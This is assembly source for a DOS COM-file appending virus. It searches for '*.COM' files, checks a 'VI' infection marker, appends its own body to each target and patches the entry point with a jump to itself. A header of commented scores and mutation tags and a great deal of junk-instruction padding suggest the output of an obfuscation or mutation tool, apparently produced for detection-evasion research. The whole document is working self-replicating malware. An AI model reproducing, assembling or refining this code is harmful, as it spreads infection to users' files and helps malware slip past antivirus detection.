;2.57950261168
;1.90680396925
;1.92898952556
;2.24434132926
;2.18258453556
;UntouchBlock_0
;2.4829193034
;UntouchBlock_0
;2.50567024875
;2.51178888979
;NoMutation
;2.0723536262
;2.33534083373
;2.24434663642
;1.83809978691
;2.38580813578
;UntouchBlock_0
;1.86375430122
;2.51131721863
;NoMutation
;2.0929813943
;2.40502157698
;1.88311101865
;2.24264324398
;		JNZ 	_0
;1.64333395829
;2.67332590756
;1.87485187947
;		JNZ 	_1
;2.10684220999
;2.07179939067
;2.13461413321
;UntouchBlock_1
;1.85423727894
;2.26234714236
;		JZ 	_1
;2.40465487139
;1.52454042885
;1.75820046584
;1.55589485873
;1.90095631605
;ForcedJMP_0
;2.32039498245
;2.09393484249
;1.84798791799
;2.05499644225
;1.70695769379
;1.95271735843
;NoMutation
;1.57981160029
;2.20271337461
;1.6668206432
;2.25846271374
;1.90617893107
;		JZ 	_1
;1.71845702049
;1.77841545215
;1.56828498031
;UntouchBlock_0
;1.72698103464
;NoMutation
;2.50683460937
;		JZ 	_1
;1.89300912261
;UntouchBlock_1
;2.58143108743
;		JZ 	_1
;1.95420272088
;1.90279050819
;2.17729926115
;UntouchBlock_1
;1.78007556068
;1.50857379939
;1.8398483617
;1.48105091704
;1.67616001557
;1.50419708253
;NoMutation
;2.14984595948
;1.58618803872
;		JZ 	_0
;2.14715998007
;1.69492487208
;1.86810537962
;ForcedJMP_1
;1.64276662591
;1.75565040136
;1.64223447792
;1.70477117065
;		JNZ 	_1
;1.62331335758
;1.34773240501
;1.45938695382
;1.48837683637
;NoMutation
;1.37949239525
;ForcedJMP_1
;1.48982616556
;1.22917191311
;1.4667239143
;1.20959111619
;1.28377861924
;NoMutation
;1.32716453349
;1.1067627822
;1.24193993591
;1.17389838771
;1.15731673625
;		JNZ 	_0
;0.985361342431
;UntouchBlock_0
;1.18863340756
;1.01817028009
;ForcedJMP_0
;1.06026825748
;		JNZ 	_0
;1.04306654313
;0.787489955053
;NoMutation
;0.826485278901
;0.573352773621
;		JNZ 	_0
;0.596691408651
;0.749477788219
;0.633208291019
;ForcedJMP_0
;0.621352414494
;NoMutation
;0.679199510718
;		JZ 	_0
;0.638079213063
;0.255120421734
;UntouchBlock_0
;		JZ 	_0
;		JNZ 	_0
MAIN    SEGMENT BYTE
		ASSUME  CS:MAIN,DS:MAIN,SS:NOTHING
		ORG     100H

HOST:
		jmp     NEAR PTR VIRUS_START   
        db      'VI'
        mov     ah,4CH
		JMP 	VBQSP
xor bx,cx
xor bx,cx
xor bx,cx
VBQSP:
        mov     al,0
        int     21H              

VIRUS:   		                 
COMFILE DB      '*.COM',0        

VIRUS_START:
RWRYF:
		call 	 XWXHB
HYMGY:
		call 	 EPIUD
        call    GET_START       

GET_START:
        sub     WORD PTR [VIR_START],OFFSET GET_START - OFFSET VIRUS
		JMP 	UYRFJ
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
UYRFJ:
        mov     dx,OFFSET DTA   
		cmp 	bx,bx
JNZ XWXHB
JMP RWRYF
XWXHB:
        mov     ah,1AH          
        int     21H        
        call    FIND_FILE       
        jz      N1
        jmp     EXIT_VIRUS      
        N1:
        call    INFECT          
        mov     dx,OFFSET FNAME 
        mov     WORD PTR [HANDLE],24H    
		JMP 	NSTKP
cmp cx,dx
cmp cx,dx
cmp cx,dx
NSTKP:
        mov     ah,9  
		JMP 	HYMGY
EPIUD:
KDRQK:
		call 	 RS_OW
_OWZC:
		call 	 SLQZY
        int     21H             

EXIT_VIRUS:
        mov     dx,80H          
        mov     ah,1AH          
        int     21H             
		JMP 	EDYUW
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
EDYUW:
        mov     bx,[VIR_START]  
        mov     ax,WORD PTR [bx+(OFFSET START_CODE)-(OFFSET VIRUS)]  
        mov     WORD PTR [HOST],ax 
		cmp 	dx,bx
JNZ SLQZY
JMP _OWZC
SLQZY:
        mov     ax,WORD PTR [bx+(OFFSET START_CODE)-(OFFSET VIRUS)+2]        
        mov     WORD PTR [HOST+2],ax        
        mov     al,BYTE PTR [bx+(OFFSET START_CODE)-(OFFSET VIRUS)+4]        
		cmp 	cx,bx
JZ BOEWC
JMP KDXKO
BOEWC:
		cmp 	bx,bx
JZ ARDQH
JMP RNXA_
ARDQH:
        mov     BYTE PTR [HOST+4],al        
		JMP 	YLIZI
ESYUH:
        mov     [VIR_START],100H   
		cmp 	dx,bx
JZ RS_OW
JMP KDRQK
RS_OW:
        ret                     

START_CODE:                     
        nop                     
        nop                     
        nop        
        nop        
        nop             
RNXA_:
KDXKO:
		call 	 BOEWC
		call 	 ARDQH
YLIZI:
		call 	 ESYUH



FIND_FILE:
        mov     dx,[VIR_START]
		JMP 	UAWNR
nop
nop
nop
nop
nop
UAWNR:
        mov     cx,3FH          
		cmp 	dx,dx
JZ VQCXU
JMP TNF__
VQCXU:
        mov     ah,4EH          
        int     21H
TNF__:
		call 	 VQCXU


FF_LOOP:
        or      al,al           
		jnz     N2
        jmp     FF_DONE
        N2:         
		call    FILE_OK         
		jnz     N3
        jmp     FF_DONE         
        N3:
		mov     ah,4FH          
		cmp 	cx,bx
JZ IBAUN
JMP FWSMU
IBAUN:
		int     21H             
HWHSD:
		call 	 LWOPP
		jmp     FF_LOOP         

FF_DONE:
BV__U:
		call 	 KBYF_
FWSMU:
		call 	 IBAUN
        ret


FILE_OK:        
        mov     dx,OFFSET FNAME 
		JMP 	UDTGP
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
UDTGP:
        mov     dx,OFFSET FNAME 
		JMP 	HWHSD
LWOPP:
		cmp 	cx,bx
JNZ KBYF_
JMP BV__U
KBYF_:
        mov     ax,3D02H      
        int     21H        
        jnc     N6
        jmp     FOK_NZEND     
    N6:
        mov     bx,ax         
YKOHV:
        push    bx            
        mov     cx,5          
        mov     dx,OFFSET START_IMAGE         
        mov     ah,3FH        
        int     21H        		
        pop     bx            
		JMP 	EOING
nop
nop
nop
nop
nop
nop
nop
nop
EOING:
		JMP 	LTH_P
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
LTH_P:
        mov     ah,3EH        
TINWQ:
		cmp 	ax,dx
JZ YFXJH
JMP EEF__
YFXJH:
        int     21H           
        mov     ax,WORD PTR [FSIZE]               
        add     ax,OFFSET ENDVIRUS - OFFSET VIRUS 
        jnc     N7
        jmp     FOK_NZEND                         
        N7:
        cmp     BYTE PTR [START_IMAGE],0E9H 
        jz      N4
        jmp FOK_ZEND        
        N4: 
        cmp     WORD PTR [START_IMAGE+3],4956H 
        jz      N5
        jmp     FOK_ZEND           
JYNXM:
		call 	 BLWGN
EEF__:
		call 	 YFXJH
        N5:
KDE_L:
		call 	 OPZAC


FOK_NZEND:
        mov     al,1          
JNZ OPZAC
JMP KDE_L
OPZAC:
        or      al,al         
        ret

FOK_ZEND:
        xor     al,al         
        ret    
YVBIX:
		call 	 EDKES
GPEOX:
		call 	 DCZFG
EHD_V:
		call 	 PMIEJ
RUKUR:
		call 	 GGYBP
LDHKP:
		call 	 EZSCA
SGPLK:
		call 	 ARWFG
XKWTB:
		call 	 NEBMT
        

INFECT:
        mov     dx,OFFSET FNAME  
		JMP 	JYNXM
BLWGN:
        mov     ax,3D02H        
		cmp 	ax,dx
JNZ EZSCA
JMP LDHKP
EZSCA:
        int     21H        
        mov     WORD PTR [HANDLE],ax            
        xor     cx,cx                       
        mov     dx,cx               
		cmp 	cx,dx
JZ NEBMT
JMP XKWTB
NEBMT:
        mov     bx,WORD PTR [HANDLE]        
		JMP 	EHD_V
PMIEJ:
		cmp 	ax,ax
JZ DCZFG
JMP GPEOX
DCZFG:
        mov     ax,4202H                    
        int     21H        
		JMP 	TKE_X
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
TKE_X:
        mov     cx,OFFSET FINAL - OFFSET VIRUS 
		cmp 	cx,bx
JZ ARWFG
JMP SGPLK
ARWFG:
		cmp 	ax,ax
JNZ GGYBP
JMP RUKUR
GGYBP:
        mov     dx,[VIR_START]           
		JMP 	ILQLZ
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
ILQLZ:
        mov     bx,WORD PTR [HANDLE]                         
        mov     ah,40H                                      
MOJYP:
        int     21H        
        xor     cx,cx           
        mov     dx,WORD PTR [FSIZE]   
        add     dx,OFFSET START_CODE -  OFFSET VIRUS     
        mov     bx,WORD PTR [HANDLE]                         
_PCON:
        mov     ax,4200H                               
		cmp 	ax,dx
JZ EDKES
JMP YVBIX
EDKES:
        int     21H        
        mov     cx,5                                    
OYHKX:
		JMP 	BEEAZ
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
BEEAZ:
		JMP 	RSUXB
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
RSUXB:
		JMP 	SY_NA
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
SY_NA:
        mov     bx,WORD PTR [HANDLE]                    
DJSGT:
        mov     dx,OFFSET START_IMAGE                  
        mov     ah,40H        
DVUTN:
        int     21H        
        xor     cx,cx                                 
        mov     dx,cx                             
        mov     bx,WORD PTR [HANDLE]         
ZFQZV:
        mov     ax,4200H                          
KVPCE:
        int     21H
        mov     bx,[VIR_START]                    
		JMP 	TBWXF
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
TBWXF:
        mov     BYTE PTR [START_IMAGE],0E9H     
        mov     ax,WORD PTR [FSIZE]             
JZ FZNWK
JMP _WLWR
FZNWK:
		JMP 	JROKD
MYPFJ:
        add     ax,OFFSET VIRUS_START-OFFSET VIRUS-3 
        mov     WORD PTR [START_IMAGE+1],ax        
        mov     WORD PTR [START_IMAGE+3],4956H       
        mov     cx,5   
        mov     dx,OFFSET START_IMAGE      
        mov     bx,WORD PTR [HANDLE]       
        mov     ah,40H                     
        int     21H        
        mov     bx,WORD PTR [HANDLE]       
		JMP 	MYEBN
HADDF:
        mov     ah,3EH                     
        int     21H        
JROKD:
		call 	 MYPFJ
_WLWR:
		call 	 FZNWK
MYEBN:
		call 	 HADDF
        ret                                

FINAL:           
ENDVIRUS        EQU     $ + 212    


       ORG     0FF2AH

DTA             DB      1AH dup (?) 
FSIZE           DW      0,0         
FNAME           DB      13 dup (?)  
HANDLE          DW      0           
START_IMAGE     DB      0,0,0,0,0   
VSTACK          DW      50H dup (?) 
VIR_START       DW      (?)         

MAIN    ENDS

        END     HOST                   